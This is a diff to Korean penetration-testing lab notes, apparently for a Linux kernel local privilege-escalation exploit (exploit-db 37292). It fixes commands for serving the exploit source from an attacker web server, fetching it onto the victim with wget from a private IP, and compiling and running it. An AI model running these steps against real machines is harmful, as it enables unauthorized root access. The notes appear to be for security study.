@@ -88,12 +88,12 @@ Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/1 | linux/local/37293.txt
 
 ## \[2-1] 서버 구축
 - 데비안 계열 웹 서버 구축은 아파치로 진행한다. `apt install -y apache2 && systemctl start apache2`
-- 파이썬도 가능 `python -m 10.0.2.15 4444`
+- 파이썬도 가능 `python -m http.server 4444`
 - `/var/www/html/37292.c`로 파일 옮긴다.
 
 ## \[2-2] 접속&다운로드
 victim의 shell에서 접속해 파일 다운
-`wget http://10.0.0.4:4444/37292.c && ls`
+`wget http://10.0.0.15:4444/37292.c && ls`
 
 ## \[2-3] 컴파일 후 실행
 `gcc -o cyber 37292.c && ./cyber`
